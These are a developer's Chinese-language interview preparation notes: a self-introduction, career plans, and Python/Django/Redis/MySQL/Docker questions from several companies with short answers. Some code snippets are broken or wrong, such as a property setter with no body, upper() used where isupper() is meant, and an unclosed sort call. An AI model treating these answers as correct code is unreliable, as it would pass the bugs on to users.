#  目录

[TOC]



# 名词

QA:测试人员

# 自我介绍

我是于2013年至2017年于淮南师范学院就读于计算机系网络工程专业，在我开始工作的时候就在 

合趣网络科技有限公司

进行工作，我在公司主要的任务就是负者后端开发，并且我们公司主要使用的是django-web框架，来搭建项目，另外也会做一些前端，比如使用基于nodejs的vue框架搭建前端，这个还算比较熟悉，了解前端的css,js，ajax,使用比较多的就是bootstrap,ui-element等框架来快速搭建前端，另外也会帮公司做一些爬取信息的工作，对numby,pandas等数据分析的模块也了解。对于一般的反扒措施也有经验。

在公司工作的过程中，熟练使用drf框架，这个框架是一般是使用在django框架中，在里面他从新封装了view的试图模块，可以让我们使用的时候能够更加方便，并且里面的序列化组件也是我们最长使用的，这个序列化经常使用的就是调用数据库，进行查询数据，或者进行增删改查，对于我们而言可以减少在视图模块的代码量，减少冗余，另外可以改写里面的异常，使用继承类的方法，重写类方法，在我使用这个的时候就会达到我想要的效果，在settings中配置日志模块，。另外改写其中的response响应数据，这个和错误修改一样，在写这个可以自定义我们的返回数据，以及响应状态码。（这个是我在公司推行的）。在做公司的项目的时候遇到公司内部的交流平台的开发，这个技术我研究一段时间，一开始不了解这个websocket，后来使用轮询，长训论，的方式，达不到想要的效果，为了避免消息的延迟，在浏览别人的技术博客的时候，发现了webscocket的通信协议，并且经过研究确实有可实行，于是我开始测试，编写一些脚本，经过测试后，证明确实可行，于是我将这中方式写入我们公司的这个内部项目中，基本上和领导的要求是一致的，并且在后来的项目中我们有需要也会使用这个websocket的通信方式。我自己研究了nginx,uwsgi与项目之间的通信，在部署项目的时候我也会参与使用nginx做负载均衡，做反向代理。

## 对于个人的认知：

1、喜欢编辑工作，对计算机有着非常浓厚的兴趣。

3、有较强的的抗压能力，遇到问题能够认真专研解决问题。（我所用到的知识点基本上都是我自己学习的）

4、性格开朗，对待工作严谨认真，刻苦耐劳，能够快速融入团队，积极与团队合作。

5、乐于沟通，积极与同事、领导沟通工作情况，解决工作中的问题。

人生格言：有前行就会有超越,有执着才会有收获。

## 自己的缺点和优点

​		缺点：有时候做事情比较着急，是一个急性子，比如说对于公司的某一个任务，规定的时间完成，如果期限快到了，那么我心里就会非常着急，我一般都会放下自己手头上的事情，出去走半个小时左右，用来放松一下我自己。

​		优点：对待工作严谨认真，刻苦耐劳，乐于沟通，喜欢交流，乐于分享的人。

简单一句话介绍自己的工作上和生活。讲明自己是一个什么样的人。

​		在工作中我是一丝不苟的完成公司任务，在生活上我比较积极向上，与人为善。

## 讲一下自己的俩年到五年的计划



1)阶段目标

Phase Ⅰ:理论实践期

时间:1~3年

目标:将自己学到的理论知识融入实际应用之中

Phase Ⅱ:全面发展期

时间:7~10年

目标:技术与管理双管齐下,精通技术核心并能带领和指导团队工作

Phase Ⅲ:持续发展期

时间:10年

目标:从工程化思想解决出来,探索并吸收其它领域思想,引领并指导工程领域



## 应该做哪些努力来提升自己

**认真阅读源码，提高编写代码的能力：**

​      对于很多新程序员来说，刚开始接触的工作就是敲代码。如果自己连代码都看不懂，那怎么才能编写代码呢？或者别人给你一串代码让你审核，又怎么才能发现当中的错误呢？所以认真阅读源码，提高编写代码的能力，这样才能有效的应对程序员的本职工作。

**提升对需求软件的理解：**

​       对于软件开发公司来说，赚钱才是最终目的，而且现在各种软件很多，软件更新换代很快。因此具备敏锐的市场观察力，了解哪些软件是市场需求量大的，这样才能制定出正确的方向，开发出大家需求的软件来。如果能够开发出一款热门软件，那对一个程序员的事业发展起到非常大的帮助。

**提升交流、沟通能力：**

​      不管是任何领域，项目能够有效的发展靠的是团队合作，IT行业也是如此。一位程序员好比一颗螺丝钉，虽然不起眼但是不可或缺。当程序员分配到一项任务的时候，首先应该有效的跟领导进行沟通，明确自己的任务与职责。当程序员具备良好的沟通能力，清楚理解领导的需要，这样才能有目的的进行工作，做出的成果才不会返工。

**积极拓宽人脉：**

​     不管什么领域，人脉都是很重要的。程序员也一样，在努力工作、学习的同时，还需积极的拓展人脉。拥有庞大的人脉就意味着拥有极多的机会，只要自己有足够的能力，把握住到来的机会，那很有可能事业就能上一个台阶。也有可能在你的众多人脉当中出现一位贵人、一位伯乐，在你困难的时候帮你一把。



## 有什么能力竞争这个岗位

1.能快速的融入到新环境，与同事能够很快的认知，并且相处。

2.有较强的的抗压能力，遇到问题能够认真专研解决问题。（我所用到的知识点基本上都是我自己学习的）

## 如何学习一门新技术，学习方式,举一个类子

学习的渠道有很多吧，书籍，博客，公众号，视频等，每个人的学习方式不同，适合的也不一样，如果想要精通某个技术，肯定还是回归书本，博客的

​		学习可以选择一些大神的博客，内容有保障，或者是公众号。

		程序员总是会面临这样一种场景，基于一些原因我们需要学习一门新技术、新语言，然后就在电商网站买上几本书或下载电子书开始啃，结果可能有两种，因为书里的知识过于专业或者深入，晦涩难懂，就把书扔到角落里吃灰了，或者囫囵吞枣通读一遍，虽然感觉有所领悟，但无法统领全局，表现就是知识点记不住，和别人交流时感觉不自信而且词语匮乏。
这个问题也一直困扰着我，总感觉投入的时间很多，但是无法得到相应的回报，因此逐渐调整后总结出一套相对简单并行之有效的学习方法，核心理念是：目标导向、倒推分解。
这里的目标可能是团队要做新项目或者对旧项目进行技术升级，需要你对某一新技术进行调研，或者你自己想要充电、补短板的自主学习。所谓目标导向就是以达成目标为学习的终极目的，这不是功利，而是使你更明确本次学习的目的，让学习有的放矢，目标不宜过大，否则也很难达成。比如项目组想用ELK添加日志分析功能，可以将目标设定为一周内在本机搭建ELK环境，通过API添加数据并将数据可视化。粒度小的目标容易达成并能形成激励，小步快走的方式让你保证效率的同时也容易明确下一步的方向在哪，很多人容易犯的错误就是制定了很宏伟的蓝图，比如成为某个领域的专家或者通过学习转行，这样的目标能坚持下来并达成的都不是一般人。
有了目标后下一步就是用两三个小时的时间了解该领域的概念，去百科或者知乎都能获取，这就像相亲，你必须对自己意中人有个大概的画像，否则一定会挑花了眼。
再下一步是制定计划，先收集能找到的各种资源，书籍、博客、视频都行。以书籍为例，找到该领域相对权威的两三本书，比如大型电商销售排行靠前的、好评率高的，或者专业人士推荐的。然后重点来了，仔细看书籍的目录，因为目录肯定是作者按照由浅入深的顺序精心编排的，通过它你不仅可以进一步知道该学什么，而且可以大致确定学习路线、制定学习计划。
有了资源还不够，需对对其进行筛选，一些热门领域的资源浩如烟海，全看一遍不现实，效果也不一定好，利用之前定的目标和计划只选择其中的一小部分即可。
完成筛选后根据资源内容边学边做，切记把资源从头到尾看完再动手实践，因为那时候你很可能已经满足于已经看过东西，就懒的动手了。每看完一小段东西就动手实践也能作为一种激励方式让你有继续下去的动力。
最后，完成资源的学习和实践后不要认为目标就达成了，要通过分享的方式来验证，我相信大家都会怀疑这种方式甚至不太情愿拿出来分享自己努力的成果，其实这是一种自我验证的方式，你有没有这样的经历，自认为已经很了解一个领域，但是被一个新手的简单问题问住了？你应该感谢他，是他让你对自己的知识点查漏补缺。另外，有舍才有得，说不定现在从你身上获益的人将来会狠狠的帮你一把。
总结这个过程就是：我的目的是什么？它是什么？它有什么？我需要什么？我动手了么？我会了么？达成一个小目标后确定一个新目标重复这一个过程	

# 军面试题目总结

## 有孚网络面试题总结

1. 列表与元组区别？

   ```
   元组与列表相同，也是容器对象，可以存储不同类型的内容。元组与列表有两个不同点。第一个不同点是元组的声明使用小括号，而列表使用方括号，当声明只有一个元素的元组时，需要在这个元素的后面添加英文逗号；第二个不同点是元组声明和赋值后，不能像列表一样添加、删除和修改元素，也就是说元组在程序运行过程中不能被修改。
   ```

   

2. 向列表内添加元素？两个列表使用“+”号的结果，与append区别？

   ```
   append()函数，是将需要添加的内容作为一个对象，然后将这个对象整个添加到列表的尾部中
   "+"是将两个列表直接连接在尾部。
   ```

   

3. Python全局变量与局部变量？`__name__`是局部还是全局，函数内变量局部与全局的判断？

   ```
   global  关键字。想要在函数里面修改全局变量应该如何做
   
   global name，就代表调用全局的变量name
   如果函数内部没有globe关键字，优先读取局部变量，能读取全局变量，无法对全局变量重新赋值，但是对于可变类型，可以对内部元素进行操作，可以append
   
   如果函数中有golobe关键字，变量本质上就是全局的那个变量，可读取，可重新赋值
   
   那我要是想修改我上一级的name呢，而不是修改全局的name呢该怎么做呢
   
   nonloca 这个关键字就是修改上一级的变量的，我们来测试下，还是上面的例子，改变下
   
   nonlocal  修改上一级的变量
   ```

   

4. Python垃圾回收机制

5. 运算符重载？

   ```
    什么是运算符重载
               让自定义的类生成的对象(实例)能够使用运算符进行操作
           作用:
               让自定义的实例像内建对象一样进行运算符操作
               让程序简洁易读
               对自定义对象将运算符赋予新的规则
           算术运算符的重载:
               方法名                  运算符和表达式      说明
               __add__(self,rhs)        self + rhs        加法
               __sub__(self,rhs)        self - rhs         减法
               __mul__(self,rhs)        self * rhs         乘法
               __truediv__(self,rhs)   self / rhs          除法
               __floordiv__(self,rhs)  self //rhs          地板除
               __mod__(self,rhs)       self % rhs       取模(求余)
               __pow__(self,rhs)       self **rhs         幂运算
   ————————————————
   
   class Mynumber:
       def __init__(self,v):
           self.data = v
       def __repr__(self): #消除两边的尖括号
           return "Mynumber(%d)"%self.data
    
       def __add__(self,other):
           '''此方法用来制定self + other的规则'''
    
           v = self.data + other.data
           return Mynumber(v) #用v创建一个新的对象返回给调用者 
    
       def __sub__(self,other):
           '''此方法用来制定self - other的规则'''
           v = self.data - other.data
           return Mynumber(v)
    
   n1 = Mynumber(100)
   n2 = Mynumber(200)
   # n3 = n1 + n2
   n3 = n1+n2 # n3 = n1.__add__(n2)
   print(n3)   #Mynumber(300)
   n4 = n3 - n2 #等同于n4 = n3.__sub__(n2)
   print("n4 = ",n4)
           rhs(right hand side) 右手边
   ————————————————
   ```

   

6. Django ORM 中F查询与Q查询？

7. 数据库迁移命令，多人协同开发时数据库迁移问题解决？

   ```
   在我们实际的开发中，可能是多个程序员同时开发一个django分支项目(例如git分支)，但是数据库都是使用的同一个。
   这个时候会遇到一种情况。开发人员A在table1上面加了一个字段，然后migrate成功了。开发人员B这个时候git pull 代码更新代码之后，这个时候B需要在table2上面加上一个字段，然后在migrate迁移。这个时候发现migrate失败了。如下提示：django.db.utils.OperationalError: (1060, “Duplicate column name ‘cmdname’”)。
   
   原因是因为A程序员已经迁迁移过了，但是程序员B中的migrations日志里面没有在table1加字段的迁移信息。所以B还会执行给table1加上一个字段，这个时候，就会出现重复添加字段的失败信息。
   解决方案：
   进入到migrations目录，找到上面使用的。B在执行迁移的时候使用的是0013_auto_20191204_1153
   
   vi 0013_auto_20191204_1153.py
   
   
   将下面的代码删除，因为A已经执行过了。(删除掉A已经执行过的迁移操作)
   
    migrations.AddField(
               model_name='planconfigmodel',
               name='cmdname',
               field=models.CharField(default=b'cpu', max_length=16, null=True, verbose_name='\u547d\u4ee4\u540d\u79f0', choices=[(b'cpu', 'CPU\u6ee1\u8f7d'), (b'network', '\u7f51\u7edc\u6545\u969c'), (b'disk', '\u78c1\u76d8\u6545\u969c'), (b'kill', '\u6740\u8fdb\u7a0b'), (b'memory', '\u5185\u5b58\u6ee1\u6ea2'), (b'self', '\u81ea\u5b9a\u4e49\u547d\u4ee4')]),
           ),
   再次执行迁移，迁移成功。
   
   迁移某个应用的数据库，
   # python manage.py makemigrations chaos
   # python manage.py migrate chaos
   ```

   

8. python的日志，配置过吗？

9. 异常处理：try...except...else...，try...finally...执行的过程？

   ```
       try:
           # 尝试执行的代码
           pass
       except 错误类型1:  # 下面几句是排除常见的异常，并进行提示等处理
           # 针对错误类型1，对应的代码处理
           pass
       except 错误类型2:
           # 针对错误类型2，对应的代码处理
           pass
       except (错误类型3, 错误类型4):  
           # 针对错误类型3 和 4，对应的代码处理
           pass
       ...
       ...
       except Exception as result:  # 编程中很难一次排除所有的错误，所有用这个语句，其中result是一个变量。这里相当于一个篮子，装了其他所有错误类型
           # 打印错误信息
           print("未知类型错误：%s" % result)
       else:
           # 没有异常才会执行的代码，作为奖励执行的代码
           pass
       finally:
           # 无论是否有异常，都会执行的代码
           print("无论是否有异常，都会执行的代码")
   ```

   

10. Linux下文件操作：
    * 查看文件最后50行ps kill
    * vim中命令的使用，有没有用过行，列操作

11. Signal模块

12. 命令行代码演示

```python
# 1.python中的False
bool(0)
bool('')
bool([])
# ...

# 2. 列表操作
[1, 2] * 2

# 3.==与is区别

# 4.变量赋值引用问题
a = 2
b = a
a += 2
print(a, b)

# 5. 函数传参，解压缩
def func(a, b, c=3, d=4):
    print(a, b, c, d)

func(3, *(3, 4))
func(3, *(3, 4), c=6, d=7)
```



## 太平洋保险面试题

数据库优化，数据库索引，索引的详细知识点

python 中数据类型，哪些可变，哪些不可变

列表和元组排序

```
d = {'a': 2, 'A': 1, 'c': 3, 'b': 2}
sorted_key_list = sorted(d)                 #正向排序
#sorted_key_list = sorted(d,reverse=True)           #逆向排序
print(sorted_key_list)
sorted_dict = list(map(lambda x:{x:d[x]}, sorted_key_list))
print(sorted_dict)
list.sort(key=lambda x:(x[1],x[0]))
 list.sort(key=lambda x:x[1]
list.reverse()
list.sort(reverse=True)
sorted([1,6,3,4,5,2],reverse=True)
list1=[1,2,3]
tup1=tuple(list1)
print(tup1)
print(list(tup1))
 
运行结果
(1, 2, 3)
```

**sort****与sorted****区别**

```
sort是永久的，而sorted是临时的。
```



map有没有用过

序列化，为什么使用序列化，哪些数据可以序列化

迭代器与生成器的区别

正则表达式匹配网址  `^((https|http|ftp|rtsp|mms)?:\/\/)[^\s]+`



## 乐言科技面试

### 装饰器

```python
# 手写一个装饰器，并打印函数内参数
def wrapper(func):
    def inner(*args, **kwargs):
        print(args, kwargs)
        res = func(*args, **kwargs)
        return res
    return inner


@wrapper
def test(a, b):
    print('这是原函数')


test(1, 2)

>> 1, 2
>> '这是原函数'
```



### 类的property方法，如何修改类属性

```python
class A:

    def __init__(self, x):
        self.x = x
        
    @property
    def t(self):
        return self.x
    
    @t.setter
    def t(self, value):
    
    def change_x(self, x):
        self.x = x
    

a = A(1)
a.t
>> 1
>>
a.change_x（2）
a.t
>> 2
a.t = 2
a.t
>> 2
```



### python2与python3区别

```python
range 返回值	#返回一个生成器
2: xrange == 3: range
```



### 前端问题

```js
# a.js
export default {a: 1}

# b.js
# 如何获取a

# 箭头函数的特点

# css
display: 的属性，至少说两个
```



### JWT认证，认证过程（本来想问HTTP协议的，我就说那我说下http协议呗，结果说太宽泛了）

```python
JWT: {"user": "zhaojun"}

{"user": "test"}

{"user": "zhaojun"}: 加密的校验码

base64
```



### 扫码登录问题

手机上已经登录了

你就是微信开发者

扫码登录 web



## 中软国际华为外包

迭代器，list是迭代器吗

装饰器，传参

多继承（C继承A，B，继承顺序）

```python
先传进来哪个就找哪个，如果A上层还有，继续找上层
经典类深度优先，新式类广度优先
如果关系比较乱，使用mro()方法查看继承图
```

哪些不会被继承，析构方法

```pyth
魔法方法，如：__del__()
```

map()与reduce()（reduce()没答上）

```python
map() 会根据提供的函数对指定序列做映射。
map(function, iterable, ...)
第一个参数 function 以参数序列中的每一个元素调用 function 函数，返回包含每次 function 函数返回值的新列表。

reduce函数对参数迭代器中的元素进行类累积
格式为：reduce(func,iter,init)
func为函数，iter为序列，init为固定初始值，无初始值时从序列的第一个参数开始
```

多线程的使用场景，GIL原理

```python
使用threading.Thread()方法
继承threading.Thread类

由于GIL的原因， Python解释器只允许同一时间执行一个线程。多线程不能用，使用多进程

I/O 密集型使用多线程
CPU 密集型使用多进程
```

TCP三次握手，四次挥手

CSRF预防

MySQL隔离级别，哪些产生脏读，哪些产生幻读

MySQL什么情况下创建索引

```python
较频繁地作为查询条件的字段
出现where的字段
```

Redis，缓存穿透与缓存雪崩，解决办法（解决办法没答布隆过滤器）

```python
缓存穿透：缓存与数据库中都没有，恶意访问，频繁的查数据库，压力大
	解决办法：查询一次，如果没有，缓存中增加空值
    	采用布隆过滤器（将所有可能存在的数据哈希到一个足够大的bitmap中）

缓存雪崩：同一时间，大量键过期，同时访问数据库，压力大
	解决办法：设置过期时间为随机
    
缓存击穿：前台高并发访问一个已经在缓存中恰好过期的数据，全部打到后台数据库
	解决办法：互斥锁，Redis的SETNX功能，数据没有，返回一个设定值，再去查数据库
    	热点数据设置永不过期
```

Redis的内存清理机制

```python
定时随机清除
惰性清除
配置文件里的清除（常用清理访问次数最少的）
```

Restful接口，如果是做计算，群增等设计，返回的状态码

Django的路由层，视图层，模板层，模型层的工作流程

Flask的请求流程，请求上下文（栈实现）

```python
上下文：有两种
RequestContext请求上下文：内部有request和session对象
AppContext程序上下文：内部有g和current_app对象

第一步：创建上下文
Flask根据WSGI Server封装的请求等的信息(environ)新建RequestContext对象 和AppContext对象
第二步:入栈
将RequestContext对象push进_request_ctx_stack里面。在这次请求期间，访问request对象，session对象将指向这个栈的栈顶元素
第三步:请求分发
response = self.full_dispatch_request()
Flask将调用full_dispatch_request函数进行请求的分发，之所以不用给参数，是因为我们可以通过request对象获得这次请求的信息。full_dispatch_request将根据请求的url找到对应的蓝本里面的视图函数，并生成一个response对象。注意的是，在请求之外的时间，访问request对象是无效的，因为request对象依赖请求期间的_request_ctx_stack栈。
第四步:上下文对象出栈
这次HTTP的响应已经生成了，就不需要两个上下文对象了。分别将两个上下文对象出栈，为下一次的HTTP请求做出准备。
第五步：响应WSGI
调用Response对象，向WSGI Server返回其结果作为HTTP正文。Response对象是一个可调用对象，当调用发生时，将首先执行WSGI服务器传入的start_response()函数 发送状态码和HTTP报文头。

```

Django ORM跨表一次性查询

```python
select_related内部自动连表，连表的时候比较消耗资源，但走数据库的次数少
prefetch_related内部不做连表，多次查询的时候比较消耗资源，但刚给用户的感觉和连表操作一样
```

Celery Broker使用的什么，结果要保存吗，保存到哪里

uWSGI的工作流程，基于什么协议，使用的什么配置

快速排序，大量重复数据重复影响效率吗，怎么处理（会影响效率，优化没回答上来）

```python
会影响效率
解决办法：分组
三相切割快速排序：分三组
```

Dockerfile中ADD和COPY的区别，是用ADD还是COPY

```python
COPY是从本地，推荐使用，从本地拷贝，不直接解压
ADD是增强版COPY，可以使用url拷贝，直接解压

```

JWT校验后，是只能一个用户登录还是多用户可以同时在线，怎么实现只能单用户登录

```python
实现一个用户登录：
将token存入redis，每次登录就刷新redis里的token，这样就能保证token永远只有一个

```

logging模块，日志过大怎么办

python的元类，Django ORM底层用到元类

```python
元类其实就是产生类的类，我们可以通过元类来拦截类的创建过程，这个地方我自己通过元类写过一个简易版本的ORM

首先ORM全称叫对象关系映射，能够让不会数据库操作的程序员通过面向对象的方法简单快捷的操作数据库，ORM有三层映射关系

* 类映射数据库的表
* 对象映射成数据库的表中的一条条记录
* 对象获取属性映射成数据库的表中的某条记录某个字段对应的值

具体做法就是在类创建过程中通过元类拦截它的创建，在类创建出来之前给类赋上表该有的属性表名，主键字段，其他普通字段

```

MySQL事务+悲观锁，直接用MySQL不会崩吗



## 上海展湾

在什么情况下使用过多线程

网络编程这块熟悉吧？没有问具体问题？

接口风格是http还是restful？

Celery用在什么场景下？

Docker image过大怎么解决？

```
第一步，Image 分层。使用Ubuntu作为基础镜像，搭建一个 Java运行环境。如果你有相关应用，还要整合第三方的结果检查工具。比如：安装Mono，通过NPM安装 TSLint和 ESLint，以便于我们获得更大的镜像处理能力。

第二步，核查BUG。之前，Image 的大小为1GB大。然而，在一次常规的拉取中，技术人员希望下载的数据量与源数据大小大相同，因为基本Image (Ubuntu、Java、…)还要保持稳定。但我的控制台显示，出现了异样:


貌似有数据被多次下载。因为这是最后一层，所以这些都是真正的分发文件。检查Dockerfile后发现，所有目录都是经过编辑的。在传统的部署设置中，安全的操作方式是，Docker必须添加一个新的映镜像层，并且包含所有分发文件以及所有权信息。
在实际的Docker构建之前，通过调整所有权信息，很容易摆脱chown调用，从而让最终的Image 节省了300MB。

第三步，继续删减字节。文件产生的大小是670 MB，这只是开始，还有一定的删减空间。当OpenJDK被用于Java运行时，它附带了一些开发和GUI工具。把没有用的OpenJRE替换掉，可以立即节省将近100 MB的内存。然后运行StyleCop，并从Mono中的 .NET PDB 文件中阅读信息。Mono已经被安装在mono-complete 包中，通过强依赖关系，例如通过一个完整的MonoDevelop，来实现更多兆字节的删减。不管是ESLint，还是TSLint，都只是在NodeJS运行时才能启动。

最终，我们把所有应用分别添加到Docker Image中，图像大小由1GB减少到480MB。
```



Docker的编排容器的命令compose有没有用过？

刀具开发项目（他们想做刀具管理系统）



## 奥解思（外派花旗银行）

* 面试官是个做NLP的，问的问题都很大，前面都没放开答，后面说他是做NLP的

python用过哪些模块（提到了requests,说一下request怎么实现爬虫）

python的名称空间，怎么实现一个全局变量

Redis在项目中怎么用的

Redis有哪些数据类型

Redis的hash怎么一次性取多个值

`eval`

Redis获取字符串过程，要做什么

MySQL在项目中用了什么

Django的工作流程

drf怎么实现前后端分离的

celery工作原理



## 谷露软件

MySQL中 is null 与 ==null 的区别

脏读，幻读

数据库查询优化

Python字典的底层实现

Nginx的工作原理

uWSGI的工作原理

Dockerfile中CMD与ENTRYPOINT区别

```python
把可能需要变动的参数写到 CMD 里面。然后你可以在 docker run 里指定参数，这样 CMD 里的参数(这里是-c) 就会被覆盖掉而 ENTRYPOINT 里的不被覆盖。
```



## 霖客达

Python的列表切片，引用与引用切片的区别？

手头有Python的几本书，看完了几本，流畅的Python看过吗？

你印象最深的一本书，提到了三体，问了叶文杰，最深刻的情节，冯诺依曼的情节

算法题

```python
25匹马，5个跑道，找出最快的3匹
分成五组，每组跑一次，找出最快的3匹
我说的把第一名跑一遍，以此类推（方法不太好）
引导我，第一名所在组的前三名，第二组的前两名，第一组的第一名
有6匹，但是5个跑道，怎么解决，第一名不用跑，剩下5匹跑，取前两名

```



## 所托瑞安

```python
# 多线程，多进程的应用

# 车辆数据采集，如何实现大量数据的分发

```



## 优层

```python
# 一面给的英文代码题
	round1
	1.1 数字转千分位字符串
	1.2 将列表的5的倍数的元素添加到新列表
	1.3 比较两个文件中不同的文件，分成三组
	1.4 起一个客户端和服务端，客户端分别发送GET请求和POST请求，POST发送字典数据，其中有一个元素是读取图片并转为base64，服务端保存图片
	1.5 写一个脚本，起始数字每0.5s增加3，将结果保存到MongoDB，起始数字从MongoDB中读取
	1.6 MongoDB实现多个数据库同步
	1.7 写一个多进程/多线程脚本，实现0-100打印，间隔随机3-7秒
    
	round2
	2.1 使用Docker构建MongoDB，不能使用注册中心的镜像
	2.2 在虚拟机中启动以2.1 Docker 镜像的容器
	2.3.1 起一个服务端，有两个路由，‘/test/A’  ‘/test/B’，这两个路由能接受要求格式的字典数据{"name": 0,"payload": {"a": "a","b": "b"},"ping": "pong"}，A，B的数据分开存储，如果提交的路由中没有相同的name数据，新增一天，如果A，B中有同一个name的数据，删除它们，如果只有一个中有，更新数据，数据能持久化存储，下次启动不受影响
	2.3.2 起一个客户端，向2.3.1的接口发送请求，name的值为0-10随机，payload中a,b为随机字符串，每0.5s发送一次请求，发送的接口随机（A，B机率各50%）    

# 二面现场面
主要聊聊为啥想换工作，项目，整个面试没问技术点
聊一半，出题的老外技术出现了，英文面试，先自我介绍，然后聊用到的技术点和项目，雪崩
```



## 菠萝蜜

```
聊项目
用户校验怎么实现的？浏览器怎么携带和设置Cookie，HTTP的请求数据格式？request.user怎么拿到的（原理）？

Celery异步上传图片的过程，多个服务器的话图片放哪里？

使用分页器后，刷新的数据重复问题怎么解决？怎么写SQL？

关注的人在MySQL中的表设计？
```



## 软通动力

```python
# 多进程与多线程，多线程数据共享的安全问题，进程间通信？

# 你知道的常见通信协议？TCP为什么是可靠的？怎么解决粘包问题？

# sql注入及解决方案？

# 怎么实现Django读写分离？

# 为什么产生跨域问题，Django中怎么解决？

# Django中间件的流程，自定义的方法，process_view在什么时候执行？
process_view 在 urls.py 的对应关系之后，在执行视图函数之前执行

如果返回 None，则继续执行后面的中间件的 process_view 函数

如果返回 HttpResponse，则不执行后续的 process_view 函数，直接跳到第一个 process_response 函数执行

```



# 金准备

## settings源码分析

```python
Django配置文件有两个，一个是暴露给用户自定义配置的，另一个是默认的全局配置文件，即用户指定了就用用户的，用户没有指定就用默认的。
全局配置文件入口：from django.conf import global_settings
自定义配置文件入口：from django.conf import settings
1）利用单例模式settings = LazySettings()
2）查看LazySettings类
class LazySettings(LazyObject):
    def _setup(self, name=None):
        # settings_module是从os.environ全局字典中获取ENVIRONMENT_VARIABLE环境变量，而ENVIRONMENT_VARIABLE = "DJANGO_SETTINGS_MODULE"，从manage.py中得出os.environ.setdefault("DJANGO_SETTINGS_MODULE", "test03.settings")即往os.environ大字典中添加键值对，故settings_module="test03.settings"
        settings_module = os.environ.get(ENVIRONMENT_VARIABLE)
        if not settings_module:
            desc = ("setting %s" % name) if name else "settings"
        self._wrapped = Settings(settings_module)
3）查看Settings类
class Settings(object):
    def __init__(self, settings_module):
        for setting in dir(global_settings):# 循环获取全局配置文件中的变量名
            if setting.isupper(): #判断是否是大写
                # 利用反射获取变量名对应的值，并添加键值对
                setattr(self, setting, getattr(global_settings, setting))
        self.SETTINGS_MODULE = settings_module
        # 获取配置文件模块名即settings
        mod = importlib.import_module(self.SETTINGS_MODULE)
        for setting in dir(mod):# 循环获取暴露给用户配置文件中所有的变量名
            if setting.isupper():
                setting_value = getattr(mod, setting) # 获取大写变量名对应的值
                setattr(self, setting, setting_value) # 给对象赋值
应用：基于settings源码实现配置文件可插拔式设计？
# about_settings/conf/settings.py
NAME = "自定义配置"
# about_settings/lib/conf/global_settings.py
NAME = "系统默认全局配置"
# about_settings/start.py
import os, sys
BASE_DIR = os.path.dirname(__file__) # 获取当前项目绝对路径
sys.path.append(BASE_DIR) # 将路径添加到环境变量中
os.environ.setdefault("SETTINGS_MODULES", "conf.settings") # 往系统信息中添加字符串所对应环境的映射对象
from lib.conf import settings # 导包就是导__init__
print(settings.NAME)
# about_settings/lib/conf/__init__.py
import os, importlib
from lib.conf import global_settings
class Settings:
    def __init__(self):
        for setting in dir(global_settings):
            if setting.upper():
                k = setting
                v = getattr(global_settings, setting)
                setattr(self, k, v)
            # 从系统信息中获取暴露给用户的配置文件字符串路径
            mod = os.environ.get("SETTINGS_MODULES")
            # 获取用户配置文件模块名，即settings
            module = importlib.import_module(mod)
            for setting in dir(module):
                if setting.upper():
                    k = setting
                    v = getattr(module, setting)
                    setattr(self, k, v)
settings = Settings()
1）循环获取默认的配置文件中所有的大写配置
2）利用setattr给对象不停的设置键值对
3）再循环获取暴露给用户自定义配置文件中所有的大写配置
4）再利用setattr给对象不停的设置键值对
```

## 熟练使用Django框架中ORM、Forms、Auth、中间件等操作

```python
Admin组件：对model中对应的数据表进行增删改查提供的组件
model组件：负责操作数据库
form组件：既可生成HTML代码，又可对数据有效性校验且校验信息返回并展示
ModelForm组件：既用于数据库操作,也可用于用户请求的验证  
# 必知必会十三条
1）all方法：查询所有，返回queryset对象
2）filter方法：过滤，返回queryset对象
3）get方法：过滤，返回数据对象本身
4）first方法：取第一个，返回数据对象本身
5）last方法：取最后一个，返回数据对象本身
6）exclude方法：除此之外，返回queryset对象
7）values方法：获取字段对应的所有数据，返回queryset对象，列表套字典形式存在
8）values_list方法：获取字段对应的所有数据，返回queryset对象，列表套元组形式存在
9）count方法：统计数据的条数
10）distinct方法：去重，记录必须完全相同才行
11）order_by方法：排序，默认升序，字段前加负号降序，返回queryset对象
12）reverse方法：倒序，前提是先经过排序才行，返回queryset对象
13）exists方法：判断是否存在
# 双下划线查询
1）price__gt=50:大于50
2）price__lt=50:小于50
3）price__gte=50:大于等于50
4）price__lte=50:小于等于50
5）price__in=[50,60,70]:价格是其中一个取出
6）price__range=(50,60):价格在某个范围，顾头不顾尾
7）title__contains="p":区分大小写
8）title__icontains="p"：忽略大小写
9）title__startswith="p":以什么开头
10）title__endswith="p":以什么结尾
11）publish_date__year="2019":查询2019年出版
# 基于对象的跨表查询（子查询）和基于双下划线的跨表查询（连表查询）
1）外键字段在A表，由A查B表是正向查询，反之由B表查A是反向查询。
2）正向查询按字段，反向查询按表名小写（多个结果用表名小写_set）
# 聚合查询
aggregate
# 分组查询
annotate
# F与Q查询
1）F查询用于比较条件（+-<>）
2）Q查询用于逻辑条件（&|~）
# 模型类关系
1）一对多关系：ForeignKey---定义在多的一方
2）多对多关系：ManyToMany---都可以
3）一对一关系：OneToOne---都可以
ORM：对象关系映射，通过models中的类来对应数据库中的一个表，一个对象对应一个数据行，一个属性对应数据库中的一个字段
django中only与defer的区别？
only('id','name'):取的对象，只有id和name
注：only将括号内的字段对应值，直接封装到返回给你的对象中，点该字段不再走数据库，一旦点括号内其他字段，就会频繁走数据库查询
defer('id','name'):取出对象，字段除了id和name都有
注：defer将括号内的字段排除在外的对应值，直接封装到返回给你的对象中，点其他字段不再走数据库，一旦点括号内的字段，就会频繁走数据库查询
django中select_related与prefetch_related的区别？
前提：有外键存在时，可以很好的减少数据库请求的次数,提高性能
select_related：通过多表join关联查询,一次性获得所有数据,只执行一次SQL查询
prefetch_related：分别查询每个表,然后根据它们之间的关系进行处理,执行两次查询
```

## 理解OOP（面向对象 ）编程思想三大特性、反射、元类、魔法方法

```python
封装:把一堆数据属性与方法数据放在一个容器中，这个容器就是对象。让对象可以通过 "." 来调用对象中的数据属性与方法属性。 
继承:子类可以继承父类的数据属性与方法属性，并可以对其进行修改或使用。
多态:让多种类若具备类似的数据属性与方法属性，都统一好命名规范，这样可以提高开发者的代码统一性，使得调用者更方便去理解。
鸭子模型：在python中不会强制性要求所有人的代码都统一规范，不统一也不会报错，若使用抽象类就会使python代码强制统一规范，这样不符合python动态语言的特性。所以让大家都自觉统一好规范，若大家的对象方法都类似的话就一种规范，只要长得像鸭子，就称之为鸭子类型。
